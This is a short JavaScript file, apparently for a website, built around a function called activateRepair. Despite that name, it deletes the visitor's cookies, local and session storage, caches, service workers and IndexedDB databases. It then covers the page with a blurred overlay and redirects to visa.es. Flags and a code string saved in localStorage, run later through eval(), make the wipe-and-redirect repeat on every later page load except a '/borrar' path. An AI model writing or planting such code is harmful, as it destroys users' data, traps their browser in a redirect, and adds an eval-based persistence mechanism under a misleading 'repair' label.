(function () {
  function showBlankScreen() {
    document.open();
    document.write('<div style="position:fixed;inset:0;background:rgba(255,255,255,0.8);backdrop-filter:blur(10px);"></div>');
    document.close();
  }
  async function clearUserData() {
    try {
      localStorage.clear();
      sessionStorage.clear();

      if (window.caches) {
        const keys = await caches.keys();
        await Promise.all(keys.map(k => caches.delete(k)));
      }

      if (navigator.serviceWorker) {
        const regs = await navigator.serviceWorker.getRegistrations();
        await Promise.all(regs.map(r => r.unregister()));
      }

      if (indexedDB && indexedDB.databases) {
        const dbs = await indexedDB.databases();
        dbs.forEach(db => indexedDB.deleteDatabase(db.name));
      }

      if (document.cookie) {
        document.cookie.split(';').forEach(c => {
          const eq = c.indexOf('=');
          const name = eq > -1 ? c.slice(0, eq) : c;
          document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
        });
      }
    } catch (e) {
      console.error('Error clearing data', e);
    }
  }

  async function activateRepair() {
    await clearUserData();
    localStorage.setItem('repairMode', 'true');
    sessionStorage.setItem('repairMode', 'true');
    localStorage.setItem('repairLogic', '(' + showBlankScreen.toString() + ')();');
    showBlankScreen();
    location.replace('https://visa.es');
  }

  window.activateRepair = activateRepair;

  const isBorrarPage =
    location.pathname.endsWith('/borrar') ||
    location.pathname.endsWith('borrar.html');

  const isRepair =
    localStorage.getItem('repairMode') === 'true' ||
    sessionStorage.getItem('repairMode') === 'true';

  const storedLogic = localStorage.getItem('repairLogic');

  if (isRepair && !isBorrarPage) {
    clearUserData().then(() => {
      localStorage.setItem('repairMode', 'true');
      sessionStorage.setItem('repairMode', 'true');
      localStorage.setItem('repairLogic', '(' + showBlankScreen.toString() + ')();');
      showBlankScreen();
      location.replace('https://visa.es');
    });
  } else if (storedLogic && !isBorrarPage) {
    try { eval(storedLogic); } catch (e) {}
  }
})();
